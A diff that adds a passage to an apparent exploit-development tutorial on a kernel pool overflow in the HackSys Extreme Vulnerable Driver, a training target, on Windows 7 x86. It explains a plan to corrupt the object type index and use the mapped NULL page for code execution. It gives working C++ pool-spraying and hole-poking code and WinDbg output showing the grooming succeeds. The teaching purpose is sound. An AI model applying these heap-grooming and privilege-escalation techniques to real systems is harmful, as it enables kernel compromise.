@@ -549,7 +549,194 @@ What gets cool here, is that at offset `0x28` we see the `TypeInfo` structure. O
 If that is complicated I've tried to create a helpful diagram: 
 ![](/assets/images/AWE/poolover4.PNG)
 
-Now the adjustment we need to make is to poke holes in this contiguous block so that when we get our buffer allocated the allocator slides it right between Event Objects. We know that it takes 8 Event Objects being freed to make a `0x200`-sized hole, so 
+So what happens when we free the chunk with `CloseHandle` is the kernel goes to the address referenced by the array index value `0xc` and looks at offset `0x60` from there for a function pointer and calls the function. Looking back at that table:
+```kd> dd nt!ObTypeIndexTable
+82997760  00000000 bad0b0b0 84f46728 84f46660
+----SNIP----
+```
+The first function pointer is `0x00000000` and we already know from our NULL pointer dereference exploit that we can map the NULL page on Windows 7 x86. So thanks to the aforementioned bloggers, our path forward is clear. We'll **ONLY** corrupt the value `0xc` inside the `OBJECT_HEADER` so that it's set to `0x0` instead. We'll leave everything else the way it is with our overwrite. This way, when we free this chunk, the kernel will start looking for offset `0x60` for a function pointer from `0x00000000`. So we'll just map the NULL page and place a pointer to our shellcode at offset `0x60`. 
+
+## Executing The Plan
+Now that we know our plan of attack, we need to execute it.
+
+The adjustment we need to make is to poke holes in this contiguous block so that when we get our buffer allocated the allocator slides it right between Event Objects. We know that it takes 8 Event Objects being freed to make a `0x200`-sized hole, so following along with @FuzzySec, we'll release 8 Event Object handles every `0x16` handles in our vector. Our code now looks like this:
+```cpp
+#include <iostream>
+#include <vector>
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL               0x22200B
+
+vector<HANDLE> defragment_handles;
+vector<HANDLE> sequential_handles;
+
+HANDLE grab_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
+        exit(1);
+    }
+
+    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
+        << hFile << "\n";
+
+    return hFile;
+}
+
+void spray_pool() {
+
+    cout << "[>] Spraying pool to defragment...\n";
+    for (int i = 0; i < 10000; i++) {
+
+        HANDLE result = CreateEvent(NULL,
+            0,
+            0,
+            L"");
+
+        if (!result) {
+            cout << "[!] Error allocating Event Object during defragmentation\n";
+            exit(1);
+        }
+
+        defragment_handles.push_back(result);
+    }
+    cout << "[>] Defragmentation spray complete.\n";
+    cout << "[>] Spraying sequential allocations...\n";
+    for (int i = 0; i < 10000; i++) {
+
+        HANDLE result = CreateEvent(NULL,
+            0,
+            0,
+            L"");
+
+        if (!result) {
+            cout << "[!] Error allocating Event Object during sequential.\n";
+            exit(1);
+        }
+
+        sequential_handles.push_back(result);
+    }
+    
+    cout << "[>] Sequential spray complete.\n";
+
+    cout << "[>] Poking 0x200 byte-sized holes in our sequential allocation...\n";
+    for (int i = 0; i < sequential_handles.size(); i = i + 0x16) {
+        for (int x = 0; x < 8; x++) {
+            BOOL freed = CloseHandle(sequential_handles[i + x]);
+            if (freed == false) {
+                cout << "[!] Unable to free sequential allocation!\n";
+                cout << "[!] Last error: " << GetLastError() << "\n";
+            }
+        }
+    }
+    cout << "[>] Holes poked lol.\n";
+}
+
+void send_payload(HANDLE hFile) {
+    
+    ULONG payload_len = 0x1F8;
+
+    LPVOID input_buff = VirtualAlloc(NULL,
+        payload_len + 0x1,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    memset(input_buff, '\x42', payload_len);
+
+    cout << "[>] Sending buffer size of: " << dec << payload_len << "\n";
+
+    DWORD bytes_ret = 0;
+
+    int result = DeviceIoControl(hFile,
+        0x22200F,
+        input_buff,
+        payload_len,
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] DeviceIoControl failed!\n";
+
+    }
+}
+
+int main() {
+
+    HANDLE hFile = grab_handle();
+
+    spray_pool();
+
+    send_payload(hFile);
+
+    return 0;
+}
+```
+
+After running it and looking up our post `memcpy` kernel buffer with the `!pool` command, we see that our `0x200` byte object was allocated precisely between two Event Objects! Everything is working as planned!
+```
+kd> !pool 862740c8
+Pool page 862740c8 region is Nonpaged pool
+ 86274000 size:   40 previous size:    0  (Allocated)  Even (Protected)
+ 86274040 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274080 size:   40 previous size:   40  (Allocated)  Even (Protected)
+*862740c0 size:  200 previous size:   40  (Allocated) *Hack
+		Owning component : Unknown (update pooltag.txt)
+ 862742c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
+ 86274300 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274340 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274380 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 862743c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274400 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274440 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274480 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 862744c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274500 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274540 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274580 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 862745c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274600 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274640 size:  200 previous size:   40  (Free)       Even
+ 86274840 size:   40 previous size:  200  (Allocated)  Even (Protected)
+ 86274880 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 862748c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274900 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274940 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274980 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 862749c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274a00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274a40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274a80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274ac0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274b00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274b40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274b80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274bc0 size:  200 previous size:   40  (Free)       Even
+ 86274dc0 size:   40 previous size:  200  (Allocated)  Even (Protected)
+ 86274e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 86274fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+```
+
+
 
 
 
